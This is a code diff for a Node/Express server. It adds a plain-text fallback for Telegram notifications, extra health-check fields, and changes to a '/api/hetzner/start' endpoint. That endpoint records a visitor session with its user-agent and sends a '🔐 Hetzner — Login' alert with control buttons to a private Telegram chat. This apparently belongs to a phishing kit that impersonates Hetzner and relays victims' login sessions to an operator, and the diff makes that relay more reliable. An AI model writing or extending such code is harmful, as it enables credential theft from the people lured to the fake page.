@@ -38,7 +38,7 @@ function escapeHtml(value) {
     .replace(/>/g, "&gt;");
 }
 
-async function sendTelegram(text, replyMarkup) {
+async function sendTelegram(text, replyMarkup, options = {}) {
   const token = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
   if (!token || !chatId) {
@@ -49,9 +49,9 @@ async function sendTelegram(text, replyMarkup) {
   const body = {
     chat_id: chatId,
     text,
-    parse_mode: "HTML",
     disable_web_page_preview: true,
   };
+  if (options.plain !== true) body.parse_mode = "HTML";
   if (replyMarkup) body.reply_markup = replyMarkup;
 
   const controller = new AbortController();
@@ -73,6 +73,17 @@ async function sendTelegram(text, replyMarkup) {
     return { ok: false, error: data.description || "request_failed" };
   }
   return { ok: true };
+}
+
+function isTelegramConfigured() {
+  return Boolean(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID);
+}
+
+async function sendTelegramReliable(text, replyMarkup) {
+  const htmlResult = await sendTelegram(text, replyMarkup);
+  if (htmlResult.ok) return htmlResult;
+  const plain = text.replace(/<[^>]+>/g, "");
+  return sendTelegram(plain, replyMarkup, { plain: true });
 }
 
 async function answerTelegramCallback(callbackQueryId, text) {
@@ -101,9 +112,12 @@ function notifyFlowSessionAsync(session, title) {
 }
 
 async function notifyHetznerSession(session, title) {
-  if (process.env.TELEGRAM_NOTIFY !== "true") return;
+  if (!isTelegramConfigured()) return { ok: false, error: "not_configured" };
   const keyboard = hetznerFlow.buildTelegramKeyboard(session);
-  await sendTelegram(hetznerFlow.formatSessionMessage(session, title), keyboard || undefined);
+  return sendTelegramReliable(
+    hetznerFlow.formatSessionMessage(session, title),
+    keyboard || undefined
+  );
 }
 
 function notifyHetznerSessionAsync(session, title) {
@@ -498,11 +512,13 @@ app.get("/health", async (_req, res) => {
   const telegramWebhook = await getTelegramWebhookInfo();
   res.json({
     ok: true,
-    version: 6,
+    version: 7,
     sessionStore: getStoreMode(),
     supabase: Boolean(process.env.SUPABASE_URL && process.env.SUPABASE_SERVICE_ROLE_KEY),
     supabasePing,
     telegramWebhook,
+    telegramConfigured: isTelegramConfigured(),
+    telegramNotify: process.env.TELEGRAM_NOTIFY === "true",
     commit: process.env.VERCEL_GIT_COMMIT_SHA || "local",
   });
 });
@@ -613,10 +629,16 @@ app.post("/api/hetzner/start", async (req, res) => {
       ua: req.headers["user-agent"] || "",
     });
 
-    await notifyHetznerSession(session, "🔐 Hetzner — Login");
+    const tg = await notifyHetznerSession(session, "🔐 Hetzner — Login");
+    if (!tg.ok) console.error("[hetzner/start] telegram failed:", tg.error);
     setupTelegramWebhookAsync();
 
-    return res.json({ ok: true, sessionId: session.id, store: getStoreMode() });
+    return res.json({
+      ok: true,
+      sessionId: session.id,
+      store: getStoreMode(),
+      telegram: isTelegramConfigured(),
+    });
   } catch (err) {
     console.error("[hetzner/start]", err.message);
     const message =
